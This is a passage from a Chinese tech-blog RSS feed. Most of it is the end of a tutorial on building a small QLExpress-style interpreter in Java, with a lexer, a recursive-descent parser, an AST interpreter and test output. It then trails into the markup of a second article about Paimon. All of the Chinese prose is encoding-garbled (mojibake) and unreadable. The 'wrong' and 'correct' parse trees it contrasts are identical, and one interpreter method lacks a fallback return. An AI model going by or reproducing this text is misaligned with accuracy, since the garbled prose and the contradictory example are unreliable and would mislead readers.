<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">parseExpression</span>() è°ƒç”¨ <span class="hljs-built_in">parseTerm</span>()
<span class="hljs-number">2</span>. <span class="hljs-built_in">parseTerm</span>() å…ˆè°ƒç”¨ <span class="hljs-built_in">parseFactor</span>() è§£æå·¦è¾¹
   <span class="hljs-built_in">parseFactor</span>() è§£æ "<span class="hljs-number">2</span>"ï¼Œè¿”å› <span class="hljs-built_in">LiteralNode</span>(<span class="hljs-number">2</span>)
<span class="hljs-number">3</span>. <span class="hljs-built_in">parseTerm</span>() çœ‹åˆ° PLUSï¼Œç»§ç»­è§£æå³è¾¹
<span class="hljs-number">4</span>. å³è¾¹è°ƒç”¨ <span class="hljs-built_in">parseFactor</span>() è§£æ "<span class="hljs-number">3</span> * <span class="hljs-number">4</span>"
<span class="hljs-number">5</span>. <span class="hljs-built_in">parseFactor</span>() çœ‹åˆ° "<span class="hljs-number">3</span>"ï¼Œå†çœ‹åˆ° MULTIPLY
   å®ƒä¼šç»§ç»­è§£æï¼Œæ„é€  <span class="hljs-built_in">BinaryOpNode</span>(<span class="hljs-number">3</span> * <span class="hljs-number">4</span>)
<span class="hljs-number">6</span>. <span class="hljs-built_in">parseTerm</span>() æ‹¿åˆ°å³è¾¹çš„ç»“æœï¼š<span class="hljs-built_in">BinaryOpNode</span>(<span class="hljs-number">3</span> * <span class="hljs-number">4</span>)
<span class="hljs-number">7</span>. æœ€ç»ˆæ„é€ ï¼š<span class="hljs-built_in">BinaryOpNode</span>(<span class="hljs-number">2</span> + (<span class="hljs-number">3</span> * <span class="hljs-number">4</span>))
</code></pre>
<p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼š</p>
<pre><code class="hljs">ä¼˜å…ˆçº§é«˜çš„è¿ç®—ç¬¦ï¼Œåœ¨é€’å½’è°ƒç”¨çš„æ›´æ·±å±‚
æ‰€ä»¥ä¼šå…ˆè¢«è§£æã€å…ˆè¢«è®¡ç®—
</code></pre>
<h3 data-id="heading-16">ä»£ç å±•ç¤º</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Parser.java</span>
<span class="hljs-keyword">private</span> ASTNode <span class="hljs-title function_">parseTerm</span><span class="hljs-params">()</span> {
    <span class="hljs-type">ASTNode</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> parseFactor();  <span class="hljs-comment">// å…ˆè§£æé«˜ä¼˜å…ˆçº§çš„</span>
    
    <span class="hljs-keyword">while</span> (match(TokenType.PLUS, TokenType.MINUS)) {
        <span class="hljs-type">Token</span> <span class="hljs-variable">operator</span> <span class="hljs-operator">=</span> previous();
        <span class="hljs-type">ASTNode</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> parseFactor();  <span class="hljs-comment">// é€’å½’è§£æå³è¾¹</span>
        left = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BinaryOpNode</span>(operator.getType(), left, right);
    }
    
    <span class="hljs-keyword">return</span> left;
}

<span class="hljs-keyword">private</span> ASTNode <span class="hljs-title function_">parseFactor</span><span class="hljs-params">()</span> {
    <span class="hljs-type">ASTNode</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> parsePrimary();  <span class="hljs-comment">// è§£ææœ€é«˜ä¼˜å…ˆçº§çš„</span>
    
    <span class="hljs-keyword">while</span> (match(TokenType.MULTIPLY, TokenType.DIVIDE)) {
        <span class="hljs-type">Token</span> <span class="hljs-variable">operator</span> <span class="hljs-operator">=</span> previous();
        <span class="hljs-type">ASTNode</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> parsePrimary();  <span class="hljs-comment">// é€’å½’è§£æå³è¾¹</span>
        left = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BinaryOpNode</span>(operator.getType(), left, right);
    }
    
    <span class="hljs-keyword">return</span> left;
}
</code></pre>
<h3 data-id="heading-17">è§£ææ ‘å¯¹æ¯”</h3>
<pre><code class="hljs language-markdown" lang="markdown">é”™è¯¯çš„è§£æï¼ˆå¦‚æœä¸åˆ†ä¼˜å…ˆçº§ï¼‰ï¼š
<span class="hljs-bullet">    +</span>
   / \
  2   *
<span class="hljs-code">     / \
    3   4
</span>
æ­£ç¡®çš„è§£æï¼ˆparseFactor å…ˆå¤„ç†ä¹˜æ³•ï¼‰ï¼š
<span class="hljs-bullet">    +</span>
   / \
  2   *
<span class="hljs-code">     / \
    3   4
</span></code></pre>
<hr/>
<h2 data-id="heading-18">å…­ã€é€’å½’ï¼šè´¯ç©¿å§‹ç»ˆçš„è®¾è®¡</h2>
<p>æ•´ä¸ª QLExpress çš„å®ç°ï¼Œåˆ°å¤„éƒ½æ˜¯é€’å½’ï¼š</p>
<h3 data-id="heading-19">é€’å½’ä¸€ï¼šè§£ææ—¶çš„é€’å½’ä¸‹é™</h3>
<pre><code class="hljs language-java" lang="java">ASTNode <span class="hljs-title function_">parseExpression</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (å½“å‰æ˜¯<span class="hljs-keyword">if</span>) {
        <span class="hljs-type">ASTNode</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> parseExpression();  <span class="hljs-comment">// é€’å½’è§£ææ¡ä»¶</span>
        <span class="hljs-type">ASTNode</span> <span class="hljs-variable">thenBranch</span> <span class="hljs-operator">=</span> parseExpression(); <span class="hljs-comment">// é€’å½’è§£æåˆ†æ”¯</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IfNode</span>(condition, thenBranch, <span class="hljs-literal">null</span>);
    }
    <span class="hljs-keyword">return</span> parseComparison();  <span class="hljs-comment">// ç»§ç»­é€’å½’</span>
}
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼š</p>
<pre><code class="hljs language-css" lang="css">æ¡ä»¶å¯ä»¥æ˜¯ä»»æ„å¤æ‚çš„è¡¨è¾¾å¼
if ((<span class="hljs-selector-tag">a</span> &gt; <span class="hljs-number">10</span> &amp;&amp; <span class="hljs-selector-tag">b</span> &lt; <span class="hljs-number">20</span>) || c == <span class="hljs-number">30</span>) ...
ä¸éœ€è¦å•ç‹¬å¤„ç†ï¼Œé€’å½’è‡ªåŠ¨æå®š
</code></pre>
<h3 data-id="heading-20">é€’å½’äºŒï¼šæ‰§è¡Œæ—¶çš„é€’å½’éå†</h3>
<pre><code class="hljs language-java" lang="java">Object <span class="hljs-title function_">interpret</span><span class="hljs-params">(ASTNode node, Context context)</span> {
    <span class="hljs-keyword">if</span> (node <span class="hljs-keyword">instanceof</span> IfNode) {
        <span class="hljs-type">Object</span> <span class="hljs-variable">cond</span> <span class="hljs-operator">=</span> interpret(node.getCondition(), context);  <span class="hljs-comment">// é€’å½’</span>
        <span class="hljs-keyword">if</span> ((Boolean) cond) {
            <span class="hljs-keyword">return</span> interpret(node.getThenBranch(), context);     <span class="hljs-comment">// é€’å½’</span>
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node <span class="hljs-keyword">instanceof</span> BinaryOpNode) {
        <span class="hljs-type">Object</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> interpret(node.getLeft(), context);        <span class="hljs-comment">// é€’å½’</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> interpret(node.getRight(), context);      <span class="hljs-comment">// é€’å½’</span>
        <span class="hljs-keyword">return</span> calculate(left, op, right);
    }
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>å¥½å¤„</strong>ï¼š</p>
<pre><code class="hljs">æ ‘æœ‰å¤šæ·±ï¼Œè‡ªåŠ¨é€’å½’å¤šæ·±
ä»£ç ç®€æ´ï¼Œé€»è¾‘æ¸…æ™°
</code></pre>
<h3 data-id="heading-21">é€’å½’è°ƒç”¨æ ˆç¤ºä¾‹</h3>
<pre><code class="hljs language-scss" lang="scss">è„šæœ¬ï¼šif (amount &gt; <span class="hljs-number">100</span>) amount * <span class="hljs-number">0.8</span>

æ‰§è¡Œæ—¶çš„è°ƒç”¨æ ˆï¼š
<span class="hljs-built_in">interpret</span>(IfNode)
  â”œâ”€ <span class="hljs-built_in">interpret</span>(BinaryOpNode &gt;)
  â”‚    â”œâ”€ <span class="hljs-built_in">interpret</span>(VariableNode amount) â†’ <span class="hljs-number">150</span>
  â”‚    â””â”€ <span class="hljs-built_in">interpret</span>(LiteralNode <span class="hljs-number">100</span>) â†’ <span class="hljs-number">100</span>
  â”‚    â””â”€ è¿”å› true
  â””â”€ <span class="hljs-built_in">interpret</span>(BinaryOpNode *)
       â”œâ”€ <span class="hljs-built_in">interpret</span>(VariableNode amount) â†’ <span class="hljs-number">150</span>
       â””â”€ <span class="hljs-built_in">interpret</span>(LiteralNode <span class="hljs-number">0.8</span>) â†’ <span class="hljs-number">0.8</span>
       â””â”€ è¿”å› <span class="hljs-number">120</span>
</code></pre>
<hr/>
<h2 data-id="heading-22">ä¸ƒã€å…³é”®ä»£ç å±•ç¤º</h2>
<h3 data-id="heading-23">è¯æ³•åˆ†æå™¨ï¼ˆLexerï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;Token&gt; <span class="hljs-title function_">tokenize</span><span class="hljs-params">(String script)</span> {
    List&lt;Token&gt; tokens = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-type">int</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">while</span> (position &lt; script.length()) {
        <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> script.charAt(position);
        
        <span class="hljs-keyword">if</span> (Character.isWhitespace(c)) {
            position++;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Character.isDigit(c)) {
            tokens.add(readNumber(script, position));
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Character.isLetter(c)) {
            <span class="hljs-type">Token</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> readIdentifier(script, position);
            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯å…³é”®å­—</span>
            <span class="hljs-keyword">if</span> (token.getText().equals(<span class="hljs-string">"if"</span>)) {
                tokens.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Token</span>(TokenType.IF, <span class="hljs-string">"if"</span>));
            } <span class="hljs-keyword">else</span> {
                tokens.add(token);
            }
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">'&gt;'</span>) {
            tokens.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Token</span>(TokenType.GREATER, <span class="hljs-string">"&gt;"</span>));
            position++;
        }
        <span class="hljs-comment">// ...</span>
    }
    
    <span class="hljs-keyword">return</span> tokens;
}
</code></pre>
<h3 data-id="heading-24">è¯­æ³•åˆ†æå™¨ï¼ˆParserï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> ASTNode <span class="hljs-title function_">parse</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> parseExpression();
}

<span class="hljs-keyword">private</span> ASTNode <span class="hljs-title function_">parseExpression</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> parseConditional();
}

<span class="hljs-keyword">private</span> ASTNode <span class="hljs-title function_">parseConditional</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (peek().getType() == TokenType.IF) {
        <span class="hljs-keyword">return</span> parseIfStatement();
    }
    <span class="hljs-keyword">return</span> parseComparison();
}

<span class="hljs-keyword">private</span> ASTNode <span class="hljs-title function_">parseIfStatement</span><span class="hljs-params">()</span> {
    consumeToken(TokenType.IF);
    consumeToken(TokenType.LPAREN);
    <span class="hljs-type">ASTNode</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> parseExpression();  <span class="hljs-comment">// é€’å½’</span>
    consumeToken(TokenType.RPAREN);
    <span class="hljs-type">ASTNode</span> <span class="hljs-variable">thenBranch</span> <span class="hljs-operator">=</span> parseExpression(); <span class="hljs-comment">// é€’å½’</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IfNode</span>(condition, thenBranch, <span class="hljs-literal">null</span>);
}
</code></pre>
<h3 data-id="heading-25">è§£é‡Šæ‰§è¡Œå™¨ï¼ˆInterpreterï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">interpret</span><span class="hljs-params">(ASTNode node, Context context)</span> {
    <span class="hljs-keyword">if</span> (node <span class="hljs-keyword">instanceof</span> IfNode) {
        <span class="hljs-keyword">return</span> interpretIf((IfNode) node, context);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node <span class="hljs-keyword">instanceof</span> BinaryOpNode) {
        <span class="hljs-keyword">return</span> interpretBinaryOp((BinaryOpNode) node, context);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node <span class="hljs-keyword">instanceof</span> FunctionCallNode) {
        <span class="hljs-keyword">return</span> interpretFunctionCall((FunctionCallNode) node, context);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node <span class="hljs-keyword">instanceof</span> VariableNode) {
        <span class="hljs-keyword">return</span> context.getVariable(((VariableNode) node).getName());
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (node <span class="hljs-keyword">instanceof</span> LiteralNode) {
        <span class="hljs-keyword">return</span> ((LiteralNode) node).getValue();
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Unknown node type"</span>);
}

<span class="hljs-keyword">private</span> Object <span class="hljs-title function_">interpretBinaryOp</span><span class="hljs-params">(BinaryOpNode node, Context context)</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> interpret(node.getLeft(), context);   <span class="hljs-comment">// é€’å½’</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> interpret(node.getRight(), context); <span class="hljs-comment">// é€’å½’</span>
    
    <span class="hljs-keyword">switch</span> (node.getOperator()) {
        <span class="hljs-keyword">case</span> PLUS:     <span class="hljs-keyword">return</span> (Double) left + (Double) right;
        <span class="hljs-keyword">case</span> MULTIPLY: <span class="hljs-keyword">return</span> (Double) left * (Double) right;
        <span class="hljs-keyword">case</span> GREATER:  <span class="hljs-keyword">return</span> (Double) left &gt; (Double) right;
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-26">å…«ã€ä¸‰æ¿æ–§æ€»ç»“</h2>
<p>å›åˆ°æœ€å¼€å§‹çš„é—®é¢˜ï¼ŒQLExpress çš„æ ¸å¿ƒå°±æ˜¯ä¸‰æ¿æ–§ï¼š</p>
<h3 data-id="heading-27">ç¬¬ä¸€æ–§ï¼šè¯æ³•åˆ†æ + è¯­æ³•åˆ†æ + AST</h3>
<pre><code class="hljs">å­—ç¬¦ä¸² â†’ Tokenæµ â†’ ASTæ ‘

æŠ€æœ¯ï¼šæ‰‹å†™çŠ¶æ€æœº + é€’å½’ä¸‹é™
ç›®çš„ï¼šæŠŠè„šæœ¬å˜æˆå¯æ“ä½œçš„æ ‘å½¢ç»“æ„
</code></pre>
<h3 data-id="heading-28">ç¬¬äºŒæ–§ï¼šæ ˆå¼é€’å½’æ‰§è¡Œ</h3>
<pre><code class="hljs">éå† AST æ ‘ï¼Œé€’å½’è®¡ç®—æ¯ä¸ªèŠ‚ç‚¹

æŠ€æœ¯ï¼šè®¿é—®è€…æ¨¡å¼ + é€’å½’éå†
ç›®çš„ï¼šç”¨ Java ä»£ç æ¨¡æ‹Ÿè„šæœ¬æ‰§è¡Œ
</code></pre>
<h3 data-id="heading-29">ç¬¬ä¸‰æ–§ï¼šåå°„è°ƒç”¨</h3>
<pre><code class="hljs language-javascript" lang="javascript">é€šè¿‡æ³¨å†Œè¡¨ + åå°„è°ƒç”¨è‡ªå®šä¹‰æ–¹æ³•

æŠ€æœ¯ï¼š<span class="hljs-title class_">Map</span> å­˜å‚¨ + <span class="hljs-title class_">Java</span> åå°„
ç›®çš„ï¼šå®‰å…¨åœ°æ‰©å±•è„šæœ¬èƒ½åŠ›
</code></pre>
<hr/>
<h2 data-id="heading-30">ä¹ã€å¯¹æ¯”çœŸå®çš„ QLExpress</h2>
<p>æ‰‹å†™ç‰ˆæœ¬å’ŒçœŸå®çš„ QLExpress æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p>








































<table><thead><tr><th>ç»´åº¦</th><th>æ‰‹å†™ç‰ˆ</th><th>QLExpress</th></tr></thead><tbody><tr><td>è¯æ³•åˆ†æ</td><td>æ‰‹å†™çŠ¶æ€æœº</td><td>ANTLR è‡ªåŠ¨ç”Ÿæˆ</td></tr><tr><td>è¯­æ³•åˆ†æ</td><td>é€’å½’ä¸‹é™</td><td>ANTLR è‡ªåŠ¨ç”Ÿæˆ</td></tr><tr><td>æ‰§è¡Œæ–¹å¼</td><td>AST è§£é‡Šæ‰§è¡Œ</td><td>æŒ‡ä»¤è™šæ‹Ÿæœºï¼ˆQVMï¼‰</td></tr><tr><td>ä»£ç é‡</td><td>700 è¡Œ</td><td>20000+ è¡Œ</td></tr><tr><td>åŠŸèƒ½å®Œæ•´æ€§</td><td>åŸºç¡€åŠŸèƒ½</td><td>ä¼ä¸šçº§å®Œæ•´</td></tr><tr><td>ä¾èµ–</td><td>é›¶ä¾èµ–</td><td>antlr4-runtime</td></tr></tbody></table>
<p><strong>çœŸå® QLExpress çš„é¢å¤–ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li>å˜é‡èµ‹å€¼</li>
<li>å¾ªç¯è¯­å¥ï¼ˆfor/whileï¼‰</li>
<li>å‡½æ•°å®šä¹‰</li>
<li>å¼‚å¸¸å¤„ç†</li>
<li>æ€§èƒ½ä¼˜åŒ–ï¼ˆæŒ‡ä»¤ç¼“å­˜ã€å¯¹è±¡æ± ï¼‰</li>
</ul>
<p>ä½†æ ¸å¿ƒæ€æƒ³æ˜¯ä¸€æ ·çš„ï¼šä¸ç”Ÿæˆ classï¼Œç”¨ Java ä»£ç æ¨¡æ‹Ÿæ‰§è¡Œã€‚</p>
<hr/>
<h2 data-id="heading-31">åã€å®Œæ•´æµ‹è¯•</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">MiniQLExpress</span> <span class="hljs-variable">runner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MiniQLExpress</span>();
        runner.register(<span class="hljs-string">"MyMath"</span>, MyMath.class);
        runner.getContext().addVariable(<span class="hljs-string">"amount"</span>, <span class="hljs-number">150.0</span>);
        
        test(runner, <span class="hljs-string">"2 + 3 * 4"</span>);
        test(runner, <span class="hljs-string">"if (amount &gt; 100) amount * 0.8"</span>);
        test(runner, <span class="hljs-string">"MyMath.discount(100, 0.8)"</span>);
        test(runner, <span class="hljs-string">"if (amount &gt; 100) MyMath.discount(amount, 0.8)"</span>);
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(MiniQLExpress runner, String script)</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> runner.execute(script);
        System.out.println(<span class="hljs-string">"Result of \""</span> + script + <span class="hljs-string">"\": "</span> + result);
    }
}
</code></pre>
<p><strong>è¿è¡Œç»“æœ</strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-type">Result</span> of <span class="hljs-string">"2 + 3 * 4"</span>: <span class="hljs-number">14.0</span>
<span class="hljs-type">Result</span> of <span class="hljs-string">"if (amount &gt; 100) amount * 0.8"</span>: <span class="hljs-number">120.0</span>
<span class="hljs-type">Result</span> of <span class="hljs-string">"MyMath.discount(100, 0.8)"</span>: <span class="hljs-number">80.0</span>
<span class="hljs-type">Result</span> of <span class="hljs-string">"if (amount &gt; 100) MyMath.discount(amount, 0.8)"</span>: <span class="hljs-number">120.0</span>
</code></pre>
<p>å…¨éƒ¨é€šè¿‡ã€‚</p>
<hr/>
<h2 data-id="heading-32">åä¸€ã€æ”¶è·</h2>
<p>èŠ±ä¸€å¤©æ—¶é—´æ‰‹å†™ 700 è¡Œä»£ç ï¼Œææ¸…æ¥šäº†å‡ ä¸ªé—®é¢˜ï¼š</p>
<p><strong>1. QLExpress çš„ if ä¸æ˜¯ JVM çš„ if</strong></p>
<pre><code class="hljs">å®ƒæ˜¯ç”¨ Java çš„ if åŒ…è£…å‡ºæ¥çš„
æ‰€ä»¥ä¸éœ€è¦ç¼–è¯‘æˆå­—èŠ‚ç 
</code></pre>
<p><strong>2. åå°„ä¸æ˜¯é­”æ³•</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">æå‰æ³¨å†Œ â†’ å­˜ <span class="hljs-title class_">Map</span>
è„šæœ¬è°ƒç”¨ â†’ ä» <span class="hljs-title class_">Map</span> å– â†’ method.<span class="hljs-property">invoke</span>
</code></pre>
<p><strong>3. é€’å½’æ˜¯çµé­‚</strong></p>
<pre><code class="hljs">è§£ææ—¶é€’å½’ â†’ å¯ä»¥å¤„ç†ä»»æ„åµŒå¥—
æ‰§è¡Œæ—¶é€’å½’ â†’ å¯ä»¥å¤„ç†ä»»æ„å¤æ‚åº¦
</code></pre>
<p><strong>4. ä¸æ˜¯æ‰€æœ‰è½®å­éƒ½éœ€è¦ ANTLR</strong></p>
<pre><code class="hljs">ç®€å•åœºæ™¯ï¼Œæ‰‹å†™ Parser è¶³å¤Ÿäº†
ä»£ç æ¸…æ™°ï¼Œå®¹æ˜“è°ƒè¯•
</code></pre>
<hr/>
<h2 data-id="heading-33">åäºŒã€ä»£ç è·å–</h2>
<p>å®Œæ•´ä»£ç å·²å¼€æºï¼ˆ700 è¡Œï¼‰ï¼š</p>
<ul>
<li>Lexer.javaï¼ˆè¯æ³•åˆ†æï¼‰</li>
<li>Parser.javaï¼ˆè¯­æ³•åˆ†æï¼‰</li>
<li>Interpreter.javaï¼ˆè§£é‡Šæ‰§è¡Œï¼‰</li>
<li>AST èŠ‚ç‚¹å®šä¹‰</li>
<li>å®Œæ•´æµ‹è¯•ç”¨ä¾‹</li>
</ul>
<p>å¯ä»¥ç›´æ¥è¿è¡Œï¼Œé›¶ä¾èµ–ã€‚</p>
<hr/>
<h2 data-id="heading-34">å†™åœ¨æœ€å</h2>
<p>æ‹†è½®å­çš„ç›®çš„ä¸æ˜¯é‡å¤é€ è½®å­ï¼Œè€Œæ˜¯ç†è§£åŸç†ã€‚</p>
<p>ä¸‹æ¬¡ç”¨ QLExpress çš„æ—¶å€™ï¼Œå¿ƒé‡Œå°±æœ‰åº•äº†ï¼š</p>
<ul>
<li>çŸ¥é“å®ƒä¸ºä»€ä¹ˆå¿«ï¼ˆä¸ç¼–è¯‘ï¼‰</li>
<li>çŸ¥é“å®ƒä¸ºä»€ä¹ˆå®‰å…¨ï¼ˆç™½åå•ï¼‰</li>
<li>çŸ¥é“å®ƒçš„å±€é™ï¼ˆåŠŸèƒ½ç›¸å¯¹ç®€å•ï¼‰</li>
</ul>
<p>å‘¨æœ«æ„‰å¿«ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Paimonæºç è§£è¯» -- FULL_COMPACTION_DELTA_COMMITS]]></title>    <link>https://juejin.cn/post/7582872365522173990</link>    <guid>https://juejin.cn/post/7582872365522173990</guid>    <pubDate>2025-12-13T08:01:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582872365522173990" data-draft-id="7582809606067830810" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Paimonæºç è§£è¯» -- FULL_COMPACTION_DELTA_COMMITS"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,Flink"/> <meta itemprop="datePublished" content="2025-12-13T08:01:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="expect7g"/> <meta itemprop="url" content="https://juejin.cn/user/3514471387235735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Paimonæºç è§£è¯» -- FULL_COMPACTION_DELTA_COMMITS
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3514471387235735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    expect7g
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T08:01:06.000Z" title="Sat Dec 13 2025 08:01:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body 